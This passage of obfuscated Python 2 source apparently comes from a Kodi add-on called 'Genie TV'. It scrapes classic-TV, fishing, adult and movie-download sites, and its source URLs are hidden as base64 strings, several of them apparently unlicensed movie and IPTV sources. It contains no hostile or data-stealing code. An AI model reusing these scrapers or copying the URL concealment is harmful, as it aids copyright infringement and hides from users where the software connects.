 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'a id="code_.+?data-f-href="(.+?)" data-code-embed="">(.+?)</a>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  iIiI1I1IiII1I1i1I1 ( url , oO00oooOOoOo0 )
  if 28 - 28: Oo + iI1Ii11iII1 % OoOoOO00 / Ooo00oOo00o + i11iIiiIii
def iIiI1I1IiII1I1i1I1 ( url , name ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( "playStream\('.+?', '(.+?)'\);" , re . DOTALL ) . findall ( Oo0oO00o )
 for url in IiI11iII1 :
  print url
  I1i1iii1Ii ( '[COLORgreen]' + name + '[/COLOR]' , url , 222 , '' )
  if 20 - 20: ii11ii1ii
def IIiiiiIiI1III ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3d3dy5zb2xpZS5vcmcvYWxpYnJhcnkvaW5kZXguaHRtbA==' ) )
 IiI11iII1 = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + ooooO0oOoOOoO , 3002 , 'http://www.solie.org/alibrary/' + IIIIiI11I11 )
def iIiI ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + IIIIiI11I11 )
def OO0OOoooo0o ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<br><a href="([^"]*)">(.+?)</a>' ) . findall ( IIi1IIIi )
 IiIi1Ii = re . compile ( 'href="([^"]*)">Season(.+?)</a>' ) . findall ( IIi1IIIi )
 next = re . compile ( '<a href="([^"]*)">Episodes</a>' ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3004 , ii11iIi1I + 'classicmovies.png' )
 for url , oO00oooOOoOo0 in IiIi1Ii :
  oo0o0000Oo0 ( '[COLORgreen]Season- ' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'classicmovies.png' )
 for url in next :
  oo0o0000Oo0 ( '[COLORgreen]NEXT[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'Next.png' )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IIII11I1I :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + IIIIiI11I11 )
def iiIIiI11II1 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<iframe.+?src="([^"]*)"' ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  oooOo ( url )
def oooOo ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<meta property="og:video" content="([^"]*)"/>' ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  o00OOo ( url )
  if 79 - 79: Ooo0OO0oOO - OoOoOO00
def Ii1iiI1 ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2FsbC8=' ) )
 IiI11iII1 = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , ooooO0oOoOOoO , 8061 , ii11iIi1I + 'classicmovies.png' )
def o0ooOOoO0oO0 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( "v.src = '([^']*)';" ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  o00OOo ( url )
  if 86 - 86: i1IIi / oO0O * OOOo0
def OOoO0OOoO0ooo ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2NsYXNzaWMtdHYv' ) )
 IiI11iII1 = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , ooooO0oOoOOoO , 8061 , ii11iIi1I + 'classictv.png' )
def ii11i1ii1 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( "v.src = '([^']*)';" ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  o00OOo ( url )
  if 37 - 37: i11iIiiIii
def iI1i ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcw==' ) )
 IiI11iII1 = re . compile ( '<li><a href="(.+?)"> (.+?).m3u</a></li>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '-' , ' ' ) . replace ( '_' , ' ' ) , ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcy8=' ) ) + ooooO0oOoOOoO , 8071 , ii11iIi1I + 'streams.png' )
def i11I ( url ) :
 Oo0oO00o = O00Ooo ( url )
 IiI11iII1 = re . compile ( 'EXTINF:.+?,(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( Oo0oO00o )
 for oO00oooOOoOo0 , url in IiI11iII1 :
  I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '_' , ' ' ) , ( url ) . strip ( ) , 404 , ii11iIi1I + 'streams.png' )
def o0oO0o0oo0O0 ( url ) :
 Oo0oO00o = O00Ooo ( url )
 IiI11iII1 = re . compile ( 'EXTINF:(.+?),(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , oO00oooOOoOo0 , url in IiI11iII1 :
  url = ( ( i1111 ( 'aHR0cDovL3BpZXN1c3R2Lm5ldDo4MDAwL2xpdmUv' ) ) + oO0o0o0ooO0oO + '/' + oo0o0O00 + url ) . strip ( )
  I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '_' , ' ' ) , url , 10012 , IIIIiI11I11 )
  if 98 - 98: iI1Ii11iII1 * iIii1I11I1II1 . oO0O * Oo / ii11ii1ii + oOO
def iiI1ii111 ( ) :
 iiiiI11ii ( 'Best Videos' , 'http://www.xvideos.com/best' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iiiiI11ii ( 'Genres' , 'http://www.xvideos.com' , 10106 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iiiiI11ii ( 'Recently Uploaded' , 'http://xvideos.com' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iiiiI11ii ( 'Tags' , 'http://www.xvideos.com/tags' , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iiiiI11ii ( 'Search' , '' , 10107 , ii11iIi1I + 'JIZBOX.png' , '' , '' , )
 if 97 - 97: O0 / i11i1 + OOooOOo . Ooo0OO0oOO % I1IiI - I1IiI
def i1IiI1Iiii ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 o0O0O = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( Oo0oO00o )
 for url in o0O0O :
  iiiiI11ii ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 IiI11iII1 = re . compile ( '<li><a href="(.+?)"><b>(.+?)</b><span class="navbadge default"(.+?)</span>' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 , i1I1i111Ii in IiI11iII1 :
  iiiiI11ii ( oO00oooOOoOo0 + ' - No of Videos : ' + ( i1I1i111Ii ) . replace ( '>' , '' ) , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 56 - 56: O0
def iIIIII1iI ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 o0O0O = re . compile ( 'href="([^"]*)">Next</a></li>' ) . findall ( Oo0oO00o )
 for url in o0O0O :
  iiiiI11ii ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10104 , ii11iIi1I + 'Next.png' , '' , '' )
 IiI11iII1 = re . compile ( ':"([^"]*)".+?;</script></a></div></div><p class="profile-name"><a href="([^"]*)">(.+?)</a></p><p class="profile-counts">\n(.+?)\n' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , url , oO00oooOOoOo0 , iIi1II11i in IiI11iII1 :
  iiiiI11ii ( oO00oooOOoOo0 + '--' + iIi1II11i , 'http://www.xvideos.com' + url + '#_tabVideos,videos-best' , 10105 , ( IIIIiI11I11 ) . replace ( 'http:\/\/' , 'http://' ) , '' , '' )
  if 8 - 8: i1IIi
  if 20 - 20: II1i1IiiIIi11 / i11i1
def I1111ii11IIII ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , url , oO00oooOOoOo0 , I1i11i , IiIi1II111I in IiI11iII1 :
  oo00O00oO ( oO00oooOOoOo0 + ' - Porn Quality : ' + IiIi1II111I + ' - ' + I1i11i , 'http://www.xvideos.com' + url , 10108 , IIIIiI11I11 , IIIIiI11I11 , IiIi1II111I + ' - ' + I1i11i )
 o00o = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( Oo0oO00o )
 for url in o00o :
  iiiiI11ii ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 45 - 45: ii11ii1ii + I1I1ii . II1i1IiiIIi11 . II1i1IiiIIi11
def iI1Iii11i1 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 O0oO = re . compile ( '<div class="main-categories">(.+?)</div>' , re . DOTALL ) . findall ( Oo0oO00o )
 o0O0O = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( Oo0oO00o )
 for url in o0O0O :
  iiiiI11ii ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10106 , ii11iIi1I + 'Next.png' , '' , '' )
 IiI11iII1 = re . compile ( '<li><a href="(.+?)" class="btn btn-default">(.+?)</a>' ) . findall ( str ( O0oO ) )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  iiiiI11ii ( oO00oooOOoOo0 , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 34 - 34: Ooo0OO0oOO - oOO * Oo / OOooOOo
  if 19 - 19: ii11ii1ii
def IiIIii1iiI ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 ii1IiiII = ( iiI11iI ) . replace ( ' ' , '+' ) . replace ( '&' , '&' )
 o0Oo0oO0oOO00 = ii1IiiII . lower ( )
 IiiI1II1II1i = 'http://www.xvideos.com/?k=' + o0Oo0oO0oOO00
 print IiiI1II1II1i + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 Oo0oO00o = I1ii1Ii1 ( IiiI1II1II1i )
 IiI11iII1 = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , ooooO0oOoOOoO , oO00oooOOoOo0 , I1i11i , IiIi1II111I in IiI11iII1 :
  oo00O00oO ( oO00oooOOoOo0 + ' - Porn Quality : ' + IiIi1II111I + ' - ' + I1i11i , 'http://www.xvideos.com' + ooooO0oOoOOoO , 10108 , IIIIiI11I11 , IIIIiI11I11 , IiIi1II111I + ' - ' + I1i11i )
 o00o = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO in o00o :
  iiiiI11ii ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + ooooO0oOoOOoO , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 1 - 1: O0
def I11II1i1 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'flv_url=(.+?)\;' ) . findall ( Oo0oO00o )
 for url in IiI11iII1 :
  IiI1ii11I1 = ( url ) . replace ( '%3A' , ':' ) . replace ( '%2F' , '/' ) . replace ( '%3F' , '?' ) . replace ( '%3D' , '=' ) . replace ( '%26' , '&' ) . replace ( '&amp' , '' )
  I1i1iI ( IiI1ii11I1 )
  if 30 - 30: OOoo0OO0 % I1IiI / ii11ii1ii * O0 * oO0O . OOOo0
def I1i1iI ( url ) :
 I1III11iiii11i1 = xbmc . Player ( iIi11I11 ( ) )
 import urlresolver
 try : I1III11iiii11i1 . play ( url )
 except : pass
 if 40 - 40: iIii1I11I1II1
 if 92 - 92: I1IiI % O0
def oo00ooooOOo00 ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5nb2Zpc2hpbmcuY28udWsvQW5nbGluZy1UaW1lcy9TZWN0aW9uL1ZpZGVvcy8=' ) )
 IiI11iII1 = re . compile ( 'class="item.+?"><a href="(.+?)">(.+?)</a></li>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( 'http://www.gofishing.co.uk' + ooooO0oOoOOoO ) . replace ( 'http://www.gofishing.co.ukhttp://www.gofishing.co.uk' , 'http://www.gofishing.co.uk' ) , 8091 , ii11iIi1I + 'gofish.png' )
def ii1i ( url ) :
 Oo0oO00o = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<h2><a id=.+?href="([^"]*)">(.+?)</a></h2>' , re . DOTALL ) . findall ( Oo0oO00o )
 IIII11I1I = re . compile ( '<h3><a href="([^"]*)" id=.+?>(.+?)</a> </h3>.+?<img src="([^"]*)"' , re . DOTALL ) . findall ( Oo0oO00o )
 next = re . compile ( 'href="([^"]*)">next</a>&gt;</li>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , ii11iIi1I + 'gofish.png' )
 for url , oO00oooOOoOo0 , IIIIiI11I11 in IIII11I1I :
  I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , 'http://www.gofishing.co.uk/' + IIIIiI11I11 )
 for url in next :
  oo0o0000Oo0 ( '[COLORgreen]NEXT[/COLOR]' , url . replace ( ' ' , '+' ) , 8091 , ii11iIi1I + 'Next.png' )
def OO00Oooo000 ( url ) :
 Oo0oO00o = O00Ooo ( url )
 IiI11iII1 = re . compile ( 'src="https://www.youtube.com/embed/(.+?)"' ) . findall ( Oo0oO00o )
 for url in IiI11iII1 :
  yt . PlayVideo ( url )
  if 38 - 38: Ooo00oOo00o . oOO
def ii111iiIii ( url ) :
 oO0o = urllib2 . Request ( url )
 oO0o . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 iIiIiIIiiiI1iI1 = ''
 iii1 = ''
 try :
  iIiIiIIiiiI1iI1 = urllib2 . urlopen ( oO0o )
  iii1 = iIiIiIIiiiI1iI1 . read ( )
  iIiIiIIiiiI1iI1 . close ( )
 except : pass
 if iii1 != '' :
  return iii1
 else :
  iii1 = 'Failed'
  return iii1
  if 86 - 86: ii11ii1ii * oOO
O0oO0o0OOOOOO = '{PQ},' ; IiI1i11IiIiii = '{SC},' ; I11iiI1I1 = '{XG},' ; o0i1Ii11II = '{JP},' ; i1iiiiI11ii = '{HW},' ; oooooOOo0o = '{RT},'
def oOO0 ( ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 OoO000Oo0oO = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 ooooO0oOoOOoO = ( i1111 ( 'aHR0cDovL2RsNC5tb3ZpZWZhcnNpLmNvbS9maWxtLzIwMTUtNy8=' ) )
 I1III1111iIi = ( i1111 ( 'aHR0cDovL2RsLmF2YWRsLmNvbS9OZXcvTW92aWUv' ) )
 OooOo0oo0O0o00O = ( i1111 ( 'aHR0cDovLzIxNy4yMTkuMTQzLjEwOC8xMzI3Lw==' ) )
 if 46 - 46: O0 - I1IiI . OoooooooOO
 i1I111II = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvbW92L2FsbC5waHA=' ) )
 Oo0OOo = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 i1II11I11ii1 = ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL3NlYXJjaC8/cT0=' ) ) + iiI11iI
 OOoO0oO00o = ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21vdmllcy9hbGxtb3ZpZS5waHA=' ) )
 OOO0OoO0oo0OO = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbG1vdmllcy5waHA=' ) )
 i1iI1Ii11Ii1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tb3ZmdWxsLnBocA==' ) )
 o0OoO0oo0O0o = ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL1NILnBocA==' ) )
 if 6 - 6: OoOoOO00 % I1I1ii
 Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Checking Sources" , '' , 'Please Wait' )
 Oo0oO00o = ii111iiIii ( ooooO0oOoOOoO )
 Oo0oO0ooo . update ( 0 , "" , "Checking Source 1/9 Links" )
 oOIIiIi = ii111iiIii ( I1III1111iIi )
 Oo0oO0ooo . update ( 14 , "" , "Checking Source 2/9 Links" )
 I1iiIiIII = ii111iiIii ( OooOo0oo0O0o00O )
 Oo0oO0ooo . update ( 28 , "" , "Checking Source 3/9 Links" )
 if 68 - 68: O0
 Oo0oO0ooo . update ( 40 , "" , "Checking Source 4/9 Links" )
 o0oOoO00 = ii111iiIii ( i1I111II )
 Oo0oO0ooo . update ( 52 , "" , "Checking Source 5/9 Links" )
 oOO000 = ii111iiIii ( i1II11I11ii1 )
 Oo0oO0ooo . update ( 64 , "" , "Checking Source 6/9 Links" )
 OoOooO = ii111iiIii ( OOoO0oO00o )
 Oo0oO0ooo . update ( 76 , "" , "Checking Source 7/9 Links" )
 OoO0o00OOOOO = ii111iiIii ( OOO0OoO0oo0OO )
 Oo0oO0ooo . update ( 88 , "" , "Checking Source 8/9 Links" )
 I1iIi1iIIIIiI = ii111iiIii ( i1iI1Ii11Ii1 )
 Oo0oO0ooo . update ( 100 , "" , "Checking Source 9/9 Links" )
 O000oooOO0Oo0 = ii111iiIii ( o0OoO0oo0O0o )
 if 31 - 31: iI1Ii11iII1 - Ooo00oOo00o / i11i1 . i1IIi / oO0O
 if 66 - 66: Ooo00oOo00o
 if Oo0oO00o != 'Failed' :
  IiI11iII1 = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( Oo0oO00o )
  for o00ooO0ooO0o0 , oO00oooOOoOo0 in IiI11iII1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source 1[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( ooooO0oOoOOoO + o00ooO0ooO0o0 ) , 222 , '' )
    Oo0oO0ooo . update ( 0 , "" , "Getting Source 1 Links" )
 if oOIIiIi != 'Failed' :
  IIII11I1I = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( oOIIiIi )
  for o00ooO0ooO0o0 , oO00oooOOoOo0 in IIII11I1I :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source 2[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( I1III1111iIi + o00ooO0ooO0o0 ) , 222 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 9 , "" , "Getting Source 2 Links" )
 if I1iiIiIII != 'Failed' :
  I1i1ii1IiIii = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( I1iiIiIII )
  for o00ooO0ooO0o0 , oO00oooOOoOo0 in I1i1ii1IiIii :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source 3[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( OooOo0oo0O0o00O + o00ooO0ooO0o0 ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 18 , "" , "Getting Source 3 Links" )
    if 88 - 88: Ooo0OO0oOO % Oo - OOoo0OO0 % Ooo0OO0oOO + iI1Ii11iII1 - II1i1IiiIIi11
    if 23 - 23: O0
    if 9 - 9: OOoo0OO0 * Oo . oOO * i11iIiiIii - O0
    if 54 - 54: OOOo0 * i11i1 + OOooOOo % i1IIi - OOooOOo + I1IiI
    if 15 - 15: I1IiI * Ooo0OO0oOO + i11i1 . OOoo0OO0 % OOOo0 - oOO
    if 13 - 13: I1IiI % I1IiI % Oo % OOOo0 * i1IIi % OOoo0OO0
    if 82 - 82: iI1Ii11iII1 . I1IiI / oOO + II1i1IiiIIi11 - oOO
 if o0oOoO00 != 'Failed' :
  o00OOo0o0O = [ ]
  I111Iii1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( o0oOoO00 )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in I111Iii1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    if oO00oooOOoOo0 in o00OOo0o0O :
     pass
    else :
     iIiIIIi ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Scooby[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , ooooO0oOoOOoO , 1016 , OOOO0OOO , I1iI11iii , o0OoOO )
     o00OOo0o0O . append ( oO00oooOOoOo0 )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 36 , "" , "Getting Scooby Links" )
     i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if oOO000 != 'Failed' :
  i11i = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( oOO000 )
  for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in i11i :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Snag[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + ooooO0oOoOOoO , 7067 , IIIIiI11I11 )
    Oo0oO0ooo . update ( 45 , "" , "Getting Snag Links" )
    if 73 - 73: oOO % oOO . II1i1IiiIIi11 + I1I1ii
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if OoOooO != 'Failed' :
  Ii1IOOooO00OO = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OoOooO )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in Ii1IOOooO00OO :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo00O00oO ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Redemption[/COLOR]' ) , ooooO0oOoOOoO , 222 , OOOO0OOO , I1iI11iii , o0OoOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 53 , "" , "Getting Redemption Links" )
    if 70 - 70: oO0O - i11i1 * i11i1 / iIii1I11I1II1 + O0
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if OoO0o00OOOOO != 'Failed' :
  IiIIi11i = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OoO0o00OOOOO )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in IiIIi11i :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo00O00oO ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Reaper[/COLOR]' ) , ooooO0oOoOOoO , 222 , OOOO0OOO , I1iI11iii , o0OoOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 61 , "" , "Getting Reaper Links" )
    if 49 - 49: ii11ii1ii + O0 . oO0O * OoooooooOO
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if I1iIi1iIIIIiI != 'Failed' :
  oO0OOO00 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( I1iIi1iIIIIiI )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in oO0OOO00 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
